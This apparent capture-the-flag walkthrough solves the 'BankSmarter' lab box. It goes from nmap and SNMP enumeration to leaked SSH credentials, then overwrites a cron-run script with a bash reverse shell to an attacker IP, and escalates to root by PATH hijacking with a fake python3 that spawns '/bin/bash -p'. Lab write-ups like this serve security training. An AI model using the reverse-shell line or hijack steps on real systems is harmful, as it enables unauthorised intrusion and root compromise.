---
title: "BankSmarter"
date: 2026-02-07
layout: "writeup"
difficulty: "Medium"
excerpt: "Walkthrough for BankSmarter on HackSmarter"
os: "Linux"
platform: "HackSmarter"
tags: [HackSmarter, SNMP]
comments: false
---

BankSmarter is a medium rated box from [Hacksmarter](https://www.hacksmarter.org). First, let's use nmap to enumerate services running on this system with:

`nmap -p- -sV -sC -T4 -oN full_scan.txt 10.0.29.53`

![BankSmarter1.png](/images/BankSmarter1.png)

After poking around and testing for RegreSSHion unsuccessfully, I decided to run a UDP scan of the top 10 UDP ports with nmap as well

`nmap -sU -F 10.0.29.53 -oN UDP_Scan.txt--top-ports 10` 

![BankSmarter1.png](/images/BankSmarter1.png)

It appears that SNMP is publicly accessible. Let's try pulling down information with the public community string with:

`snmpwalk -v1 -c public 10.0.29.53`

![BankSmarter3.png](/images/BankSmarter3.png)

It appears that we may possibly have some credentials. I had a cople of failed attempts here, but after making the username lowercase I was able to login without any issue as Layne via SSH:

![BankSmarter4.png](/images/BankSmarter4.png)

Looking at layne's home directory, you will find the user.txt file present. One flag down, one to go. There is also a shell script that might be of interest named bankSmarter_backup.sh. This file contains several mentions of commands that could be abused via path hijacking. We also might be able to move this file to a new name (since it's under layne's home directory) and create our own script.

![BankSmarter5.png](/images/BankSmarter5.png)

Let's first use pspy to confirm that this script is running:

![BankSmarter6.png](/images/BankSmarter6.png)

It appears that UID 1002 is running this script once a minute. Reviewing /etc/passwd shows us that this is user scott.weiland. Let's try to move the existing script with:

`mv bankSmarter_backup.sh bankSmarter_backup.sh.bak`

![BankSmarter7.png](/images/BankSmarter7.png)

Success! This means we can now create our own script to do our bidding. Let's  use this to our advantage to get a reverse shell. Now that the original script has been moved, let's create our own file with the following contents:

```bash
bash -i >& /dev/tcp/10.200.34.172/4545 0>&1
```

Next, let's create a netcat listener on our attacker machine with:

`nc -nvlp 4545`

Within a minute or so, we should catch a reverse shell as scott.weiland!

![BankSmarter8.png](/images/BankSmarter8.png)

The first thing of note in scott's home directory is the fact that his bash history is available:

![](C:\Users\kbvau\AppData\Roaming\marktext\images\2026-02-07-23-36-22-image.png)

This file has some interesting contents, including a reference to socat.

![BankSmarter9.png](/images/BankSmarter9.png)

Running the socat command found in the .bash_history file laterally moves us to a shell as ronnie.stone:

![BankSmarter10.png](/images/BankSmarter10.png)

Running `id` shows us that ronnie is a member of several groups:

![BankSmarter11.png](/images/BankSmarter11.png)

Let's see if there's any files of interest associated with any of these groups:

![BankSmarter12.png](/images/BankSmarter12.png)

It appears that the bankers group is associated with what appears to be a custom binary, **bank_backupd**. Navigating to the /usr/local/bin directory shows that there is both a binary and a python script present:

![BankSmarter13.png](/images/BankSmarter13.png)

Since these are owned by root, it is safe to say that the root user typically runs these files. Let's run the binary first to see what it does:

![BankSmarter14.png](/images/BankSmarter14.png)

As the name implies, it is performing a backup of account information. It also appears to be running the python file located in the same directory. Reviewing the python script makes it quite evident on how this can be abused.

![BankSmarter15.png](/images/BankSmarter15.png)

The section highlighted above shows that python3 is being called via an environment variable. This means that we can hijack this path and run another executable of our chosing. First, let's modify the PATH environment variable by running:

`PATH=/tmp:$PATH`

This puts /tmp as the first path to look for the "python3" binary. Next, in the /tmp folder, use the echo command to create the "python3" malicious binary that will create a privileged bash shell:

`echo -e '#!/bin/bash\n/bin/bash -p' > python3`

Use chmod to make this executable with:

`chmod +x python3`

Next, run the bank_backupd file. Within a few moments you should have a root shell!

![BankSmarter17.png](/images/BankSmarter17.png)

All that's left is to navigate to the /root directory and get the final flag from root.txt!

![BankSmarter18.png](/images/BankSmarter18.png)
